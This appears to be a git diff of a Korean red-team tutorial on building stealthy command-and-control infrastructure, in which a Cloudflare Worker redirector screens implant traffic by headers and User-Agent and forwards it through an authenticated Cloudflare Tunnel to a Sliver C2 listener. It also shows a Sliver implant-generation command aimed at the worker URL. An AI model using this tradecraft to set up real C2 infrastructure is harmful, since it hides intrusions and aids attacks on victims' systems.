@@ -11,7 +11,7 @@ description: >-
 
 서버리스 컴퓨팅 서비스인 Cloudflare Workers와 제로 트러스트 터널 서비스 등을 활용하면 간단하면서도 작전 보안에 탁월한 공격자 인프라를 손쉽게 구축할 수 있다. 물론 VPC, 서브넷, VPN, 가상 머신 등 대규모 인프라를 직접 구축하는 방법도 있지만, 클라우드 프로바이더가 제공하는 서비스만을 이용해 최소한의 인프라로 구성하는 방법 또한 빠르고 효율적이며, 작전 보안에 유리할 수 있다.
 
-<figure><img src="../.gitbook/assets/cloudflare-tunnel-worker-rdr.png" alt=""><figcaption><p>클릭시 커짐</p></figcaption></figure>
+<figure><img src="../.gitbook/assets/cloudflare-tunnel-worker-rdr (1).png" alt=""><figcaption></figcaption></figure>
 
 이번 글에서는 위 다이어그램처럼 에이전트 --> 클라우드플레어 워커(Worker) URL --> 워커만 접근 가능한 클라우드플레어 터널 --> 공격자 C2 서버까지 콜백하는 간단 인프라를 만들어본다.
 
@@ -38,9 +38,20 @@ Access는 제로 트러스트 환경에서 인증, 접근 제어, 토큰 관리,
 3. 생성한 서비스 토큰을 터널에 보안 정책으로 부여
 4. 클라우드플레어 워커(Worker) 생성, 리다이렉터 코드 업데이트
 
-이 페이지를 읽을 정도면 0번 정도는 굳이 설명을 안해도 될테니, 생략한다.
+이 페이지를 읽을 정도면 0번 정도는 설명을 안해도 될테니, 생략한다.
 
-1\~4번은 숙달만 되면 거의 5분 내로 할 수도 있다. 공격자 C2 또한 터널을 사용할 것이기 때문에 클라우드, VPS, 심지어 로컬 호스트(vmware + 칼리, 등) 등, 어디에 있던지 상관 없다. 물론 실제 오퍼레이션이였다면 작전 보안을 생각해 클라우드 가상머신 + 방화벽 정책 + 하드닝 된 호스트를 준비하는 것이 좋을 것이다.
+1\~4번은 숙달만 되면 5분 내로 할 수도 있다. 공격자 C2 또한 터널을 사용할 것이기 때문에 클라우드, VPS, 심지어 로컬 호스트(vmware + 칼리, 등) 등, 어디에 있던지 상관 없다. 물론 실제 오퍼레이션이였다면 작전 보안을 생각해 클라우드 가상머신 + 방화벽 정책 + 하드닝 된 호스트를 준비하는 것이 좋을 것이다.
+
+## 트래픽 전송 단계&#x20;
+
+<figure><img src="../.gitbook/assets/cloudflare-tunnel-worker-rdr.png" alt=""><figcaption></figcaption></figure>
+
+모든 설정이 끝나면 위 다이어그램처럼 트래픽이 전송된다.
+
+1. C2 에이전트) 클라우드플레어의 워커 URL인 `<워커>.<커스텀도메인>.workder.dev` 로 콜백한다.
+2. 워커) 들어오는 트래픽에 대해 HTTP Header, Header value, User Agent 등을 확인해 오로지 C2 에이전트의 트래픽만 받는다.
+3. 워커) 들어오는 C2 에이전트 트래픽이 모든 검사를 통과한다면, 서비스 토큰 (CF-Access-Client-Id, CF-Access-Client-Secret) 을 붙여서 백엔드 터널로 보낸다.
+4. 터널) 터널은 리다이렉터에서 보내는 트래픽에서 서비스 토큰이 붙어있는 것을 확인하고, 터널을 통해 공격자 호스트의 127.0.0.1:443 C2 리스너로 트래픽을 보낸다
 
 ## 인프라 구성
 
@@ -86,6 +97,10 @@ error code: 502root@ip-10-1-14-169:~#
 
 ### 2. 터널 인증용 Access 서비스 토큰 생성
 
+위에서 터널을 생성했지만, 현재 이 터널은 공인 호스트 이름에 연결되어 있고 인터넷에서 인증 없이 접근 가능한 상태다. 따라서 접근 제어 및 인증을 위해서 서비스 토큰을 생성한 뒤, 터널에 부여해 오로지 인가 받은 트래픽만 터널에 접근할 수 있도록 설정한다.
+
+
+
 Zero Trust > Access > 서비스 인증 > 서비스 토큰 생성 (기간은 마음대로)
 
 <figure><img src="../.gitbook/assets/3-access-create-srv-token.png" alt=""><figcaption></figcaption></figure>
@@ -117,7 +132,7 @@ Zero Trust > Access > 응용 프로그램 > 응용 프로그램 추가 > 자체 
 
 마지막 페이지에서는 딱히 아무 설정도 안해도 된다.
 
-여기까지 했으면 테스트를 진행한다. 서비스 토큰 (CF-Access-Client-Id, Secret)을 붙이지 않고 curl을 하면 403 Forbidden이 뜬다. 하지만 서비스 토큰을 헤더 형태로 붙여서 보내면 Access를 넘어 502가 뜨는 것을 볼 수 있다.
+여기까지 했으면 테스트를 진행한다. 서비스 토큰 (CF-Access-Client-Id, Secret)을 붙이지 않고 curl을 하면 403 Forbidden이 뜬다. 하지만 서비스 토큰을 헤더 형태로 붙여서 보내면 Access를 통과해 터널에 도착하고, 맨 처음과 동일하게 502가 뜨는 것을 볼 수 있다.
 
 ```
 # 서비스 토큰 없이 Access에 막힘 
@@ -135,6 +150,10 @@ content-type: text/plain; charset=UTF-8
 ```
 
 ### 4. 클라우드플레어 워커(Worker) 생성, 리다이렉터 코드 업데이트
+
+터널 설정이 끝났다면, 이제 리다이렉터 역할을 할 워커를 생성한다. 이 워커는 들어오는 HTTP 트래픽을 상대로 HTTP 헤더 + User Agent 검사를 해 오로지 허가 받은 트래픽만 리다이렉트 되도록 검사한다. 허가 받은 트래픽에는 위에서 생성한 터널 접근용 서비스 토큰을 붙여 터널로 리다이렉트한다.
+
+
 
 * 클라우드플레어 > Workers and Pages > Worker 생성 > 배포
 * 클라우드플레어 > Workers and Pages > 하위 도메인 변경
@@ -219,6 +238,10 @@ content-type: text/plain; charset=UTF-8
 
 ## 결과 확인
 
+<figure><img src="../.gitbook/assets/cloudflare-tunnel-worker-rdr.png" alt=""><figcaption></figcaption></figure>
+
+모든 설정이 끝났으니, 맨 처음 설명했던대로 트래픽이 전송될 것이다.
+
 다음은 Sliver v1.5.42와 간단한 Malleable C2 프로필, 그리고 `generate --debug -b https://<워커노드>.workers.dev -f exe -s /tmp/sliver-int.exe` 를 이용한 테스트다.
 
 **설정에 사용된 malleable c2의 헤더 + UA**
@@ -245,7 +268,7 @@ content-type: text/plain; charset=UTF-8
 < ... 생략 ... > 
 ```
 
-**슬리버 에이전트 + 팀 서버**
+**슬리버 에이전트 + 팀 서버 출력**&#x20;
 
 ```bash
 # 슬리버 에이전트 
